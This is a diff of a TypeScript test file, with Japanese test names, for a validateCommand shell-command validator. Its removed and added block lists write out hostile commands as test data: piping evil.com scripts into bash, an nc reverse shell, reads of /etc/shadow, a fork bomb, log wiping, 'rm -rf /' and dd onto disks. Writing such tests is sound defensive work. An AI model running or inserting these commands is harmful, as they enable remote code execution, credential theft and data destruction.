@@ -2,7 +2,7 @@ import { describe, expect, test } from "bun:test";
 import { validateCommand } from "./validate-command";
 
 describe("validateCommand", () => {
-	describe("安全なコマンド（許可必須）", () => {
+	describe("安全なコマンド → isValid: true", () => {
 		const safeCommands = [
 			// 基本コマンド
 			"ls -la",
@@ -43,11 +43,12 @@ describe("validateCommand", () => {
 			"sqlite3 database.db",
 			"mongo",
 
-			// チェーンコマンド
+			// 安全なチェーンコマンド
 			"npm install && npm run build",
 			"source venv/bin/activate && python script.py",
+			"cd /tmp && ls -la && pwd",
 
-			// Docker（安全操作）
+			// Docker 安全操作
 			"docker ps",
 			"docker ps -a",
 			"docker logs my-container",
@@ -55,7 +56,7 @@ describe("validateCommand", () => {
 			"docker run -d myapp",
 			"docker exec -it myapp bash",
 
-			// Prisma（安全操作）
+			// Prisma 安全操作
 			"npx prisma generate",
 			"npx prisma migrate dev",
 			"npx prisma db push",
@@ -66,203 +67,178 @@ describe("validateCommand", () => {
 			test(`許可: ${command}`, () => {
 				const result = validateCommand(command);
 				expect(result.isValid).toBe(true);
-				expect(result.violations).toHaveLength(0);
+				expect(result.reason).toBe("");
 			});
 		}
 	});
 
-	describe("確認必須コマンド（CONFIRM_REQUIRED）", () => {
-		const confirmRequiredCommands = [
-			// rm コマンド - 全て確認要求（rm -r/-rf は除く）
-			"rm file.txt",
-			"rm -f file.txt",
-			"rm *.log",
-			"rm -i test.txt",
-
-			// mv コマンド - 全て確認要求
-			"mv file1.txt file2.txt",
-			"mv /tmp/file1.txt /tmp/file2.txt",
-			"mv -f old.txt new.txt",
+	describe("CRITICAL_PATTERNS → isValid: false, reason に 'Critical' を含む", () => {
+		const criticalCommands = [
+			["rm -rf /", "rm -rf / with space"],
+			["rm -rf /  ", "rm -rf / with trailing space"],
+			["rm -rf ~//*", "rm -rf ~/* at end of line"],
+			["dd if=/dev/zero of=/dev/sda", "dd to physical disk /dev/sda"],
+			["dd if=/dev/zero of=/dev/hda", "dd to physical disk /dev/hda"],
 		];
 
-		for (const command of confirmRequiredCommands) {
-			test(`確認要求: ${command}`, () => {
+		for (const [command, description] of criticalCommands) {
+			test(`ブロック: ${description}`, () => {
 				const result = validateCommand(command);
 				expect(result.isValid).toBe(false);
-				expect(result.severity).toBe("MEDIUM");
-				expect(result.violations[0]).toContain("requires confirmation");
-			});
-		}
-
-		// git サブコマンドは許可
-		test("git rm は許可（git がメインコマンド）", () => {
-			const result = validateCommand("git rm file.txt");
-			expect(result.isValid).toBe(true);
-		});
-
-		test("git mv は許可（git がメインコマンド）", () => {
-			const result = validateCommand("git mv old.txt new.txt");
-			expect(result.isValid).toBe(true);
-		});
-	});
-
-	describe("危険なコマンド（ブロック必須）", () => {
-		const dangerousCommands = [
-			// システム破壊
-			"rm -rf /",
-			"rm -rf /etc",
-			"rm -rf /usr",
-			"rm -rf /bin",
-			"sudo rm -rf /",
-
-			// デバイス破壊
-			"dd if=/dev/zero of=/dev/sda",
-			"mkfs.ext4 /dev/sda",
-			"shred -n 3 /dev/sda",
-
-			// 特権昇格
-			"sudo chmod 777 /etc/passwd",
-			"sudo chown root:root file",
-			"sudo passwd root",
-			"chmod 777 /etc/passwd",
-			"chown root file",
-			"usermod -aG sudo user",
-
-			// ネットワーク攻撃
-			"nc -l 4444 -e /bin/bash",
-			"nmap -sV 192.168.1.0/24",
-			"telnet evil.com 4444",
-			"iptables -F",
-
-			// リモートコード実行
-			"curl http://evil.com/script.sh | bash",
-			"wget http://evil.com/payload.py | python",
-			"curl -sSL http://evil.com/install.sh | sh",
-
-			// フォークボム
-			":(){:|:&};:",
-			"while true; do echo fork; done",
-
-			// センシティブファイルアクセス
-			"cat /etc/passwd",
-			"cat /etc/shadow",
-			"cat /etc/sudoers",
-			"echo 'malicious' >> /etc/sudoers",
-
-			// システムサービス操作
-			"systemctl stop firewalld",
-			"kill -9 1",
-			"killall sshd",
-			"mount /dev/sda /mnt",
-
-			// ログ改ざん
-			"rm -rf /var/log/",
-			"echo '' > ~/.bash_history",
-			"> /var/log/auth.log",
-
-			// カーネル操作
-			"insmod malicious.ko",
-			"cat /dev/mem",
-			"modprobe malicious",
-
-			// Cron 操作
-			"crontab -e",
-			"echo '* * * * * malicious' >> /var/spool/cron/root",
-
-			// Docker 危険操作
-			"docker rm -f $(docker ps -aq)",
-			"docker system prune -af --volumes",
-			"docker container prune -f",
-			"docker volume rm $(docker volume ls -q)",
-			"docker network rm $(docker network ls -q)",
-			"docker rmi -f $(docker images -q)",
-			"docker stop $(docker ps -q)",
-			"docker kill $(docker ps -q)",
-
-			// Prisma 危険操作
-			"npx prisma migrate reset",
-			"npx prisma migrate reset --force",
-			"npx prisma db push --force-reset",
-
-			// パイプ経由の rm/mv
-			"find . -name '*.tmp' | rm",
-			"ls *.txt | xargs rm",
-			"find . -type f -name 'test*' -exec rm {} \\;",
-			"cat files.txt | mv",
-		];
-
-		for (const command of dangerousCommands) {
-			test(`ブロック: ${command}`, () => {
-				const result = validateCommand(command);
-				expect(result.isValid).toBe(false);
-				expect(result.severity).toMatch(/HIGH|CRITICAL/);
-				expect(result.violations.length).toBeGreaterThan(0);
+				expect(result.reason).toContain("Critical");
 			});
 		}
 	});
 
-	describe("エッジケース", () => {
-		test("空コマンドは拒否", () => {
-			const result = validateCommand("");
-			expect(result.isValid).toBe(false);
-			expect(result.violations).toContain("Invalid command format");
+	describe("DANGEROUS_CHAINS → isValid: false, reason に 'Dangerous chain' を含む", () => {
+		describe("パイプで危険なコマンドに渡す", () => {
+			const pipeCommands = [
+				"echo test | rm -f file.txt",
+				"cat files.txt | sudo reboot",
+				"ls | dd if=/dev/zero of=/tmp/test",
+				"find . | shred -n 3 file",
+			];
+
+			for (const command of pipeCommands) {
+				test(`ブロック: ${command}`, () => {
+					const result = validateCommand(command);
+					expect(result.isValid).toBe(false);
+					expect(result.reason).toContain("Dangerous chain");
+				});
+			}
 		});
 
-		test("2000文字超は拒否", () => {
-			const longCommand = "echo " + "a".repeat(2001);
-			const result = validateCommand(longCommand);
-			expect(result.isValid).toBe(false);
-			expect(result.violations[0]).toContain("Command too long");
+		describe("xargs で危険なコマンドを実行", () => {
+			const xargsCommands = [
+				"ls *.txt | xargs rm -f",
+				"find . -name '*.tmp' | xargs sudo rm",
+				"cat files.txt | xargs dd if=/dev/zero",
+				"echo files | xargs shred",
+			];
+
+			for (const command of xargsCommands) {
+				test(`ブロック: ${command}`, () => {
+					const result = validateCommand(command);
+					expect(result.isValid).toBe(false);
+					expect(result.reason).toContain("Dangerous chain");
+				});
+			}
 		});
 
-		test("バイナリ含有は拒否", () => {
-			const binaryCommand = "echo \x00\x01\x02";
-			const result = validateCommand(binaryCommand);
-			expect(result.isValid).toBe(false);
-			expect(result.violations[0]).toContain("Binary or encoded content");
+		describe("サブシェルでの危険な操作", () => {
+			const subshellCommands = [
+				"echo $(rm -rf /tmp/test)",
+				"ls $(sudo reboot)",
+				"cat $(dd if=/dev/zero of=/tmp/test)",
+				"find $(shred file.txt)",
+			];
+
+			for (const command of subshellCommands) {
+				test(`ブロック: ${command}`, () => {
+					const result = validateCommand(command);
+					expect(result.isValid).toBe(false);
+					expect(result.reason).toContain("Dangerous chain");
+				});
+			}
 		});
 
-		test("クォート内のセパレータは分割しない", () => {
-			const result = validateCommand('echo "hello && world"');
-			expect(result.isValid).toBe(true);
+		describe("バッククォートでの危険な操作", () => {
+			const backtickCommands = [
+				"echo `rm -rf /tmp/test`",
+				"ls `sudo reboot`",
+				"cat `dd if=/dev/zero of=/tmp/test`",
+				"find `shred file.txt`",
+			];
+
+			for (const command of backtickCommands) {
+				test(`ブロック: ${command}`, () => {
+					const result = validateCommand(command);
+					expect(result.isValid).toBe(false);
+					expect(result.reason).toContain("Dangerous chain");
+				});
+			}
+		});
+
+		describe("セミコロンで危険なコマンドをチェーン", () => {
+			const semicolonCommands = [
+				"ls; rm -rf /tmp/test",
+				"pwd; sudo reboot",
+				"date; dd if=/dev/zero of=/tmp/test",
+				"echo test; shred file.txt",
+			];
+
+			for (const command of semicolonCommands) {
+				test(`ブロック: ${command}`, () => {
+					const result = validateCommand(command);
+					expect(result.isValid).toBe(false);
+					expect(result.reason).toContain("Dangerous chain");
+				});
+			}
+		});
+
+		describe("&& で危険なコマンドをチェーン", () => {
+			const andCommands = [
+				"ls && rm -rf /tmp/test",
+				"pwd && sudo reboot",
+				"date && dd if=/dev/zero of=/tmp/test",
+				"echo test && shred file.txt",
+			];
+
+			for (const command of andCommands) {
+				test(`ブロック: ${command}`, () => {
+					const result = validateCommand(command);
+					expect(result.isValid).toBe(false);
+					expect(result.reason).toContain("Dangerous chain");
+				});
+			}
+		});
+
+		describe("|| で危険なコマンドをチェーン", () => {
+			const orCommands = [
+				"ls || rm -rf /tmp/test",
+				"pwd || sudo reboot",
+				"date || dd if=/dev/zero of=/tmp/test",
+				"echo test || shred file.txt",
+			];
+
+			for (const command of orCommands) {
+				test(`ブロック: ${command}`, () => {
+					const result = validateCommand(command);
+					expect(result.isValid).toBe(false);
+					expect(result.reason).toContain("Dangerous chain");
+				});
+			}
 		});
 	});
 
-	describe("特殊なケース", () => {
-		test("source コマンドは常に許可", () => {
-			const result = validateCommand("source ~/.bashrc");
-			expect(result.isValid).toBe(true);
-		});
-
-		test("python コマンドは常に許可", () => {
-			const result = validateCommand("python script.py");
-			expect(result.isValid).toBe(true);
-		});
-
-		test("安全なパスへの rm -rf は許可", () => {
+	describe("境界値", () => {
+		test("rm -rf /tmp/test → isValid: true（サブパスは対象外）", () => {
 			const result = validateCommand("rm -rf /tmp/test");
 			expect(result.isValid).toBe(true);
 		});
 
-		test("開発者ディレクトリへの rm -rf は許可", () => {
-			const result = validateCommand("rm -rf ~/Developer/test");
-			expect(result.isValid).toBe(true);
-		});
-
-		test("相対パスへの rm -rf は許可", () => {
+		test("rm -rf ./node_modules → isValid: true（相対パス）", () => {
 			const result = validateCommand("rm -rf ./node_modules");
 			expect(result.isValid).toBe(true);
 		});
 
-		test("チェーンコマンドの一部が危険な場合は全体をブロック", () => {
-			const result = validateCommand("ls && rm -rf /etc");
-			expect(result.isValid).toBe(false);
-			// 危険パターンまたはチェーン検出のどちらかでブロックされる
-			expect(result.violations.length).toBeGreaterThan(0);
+		test("git add . && git commit -m 'msg' → isValid: true（安全なチェーン）", () => {
+			const result = validateCommand("git add . && git commit -m 'msg'");
+			expect(result.isValid).toBe(true);
 		});
 
-		test("安全なコマンドのチェーンは許可", () => {
-			const result = validateCommand("cd /tmp && ls -la && pwd");
+		test("npm install && npm run build → isValid: true（安全なチェーン）", () => {
+			const result = validateCommand("npm install && npm run build");
+			expect(result.isValid).toBe(true);
+		});
+
+		test("ls | grep pattern → isValid: true（パイプだが危険コマンドではない）", () => {
+			const result = validateCommand("ls | grep pattern");
+			expect(result.isValid).toBe(true);
+		});
+
+		test("find . -name '*.js' | xargs cat → isValid: true（xargs だが危険コマンドではない）", () => {
+			const result = validateCommand("find . -name '*.js' | xargs cat");
 			expect(result.isValid).toBe(true);
 		});
 	});
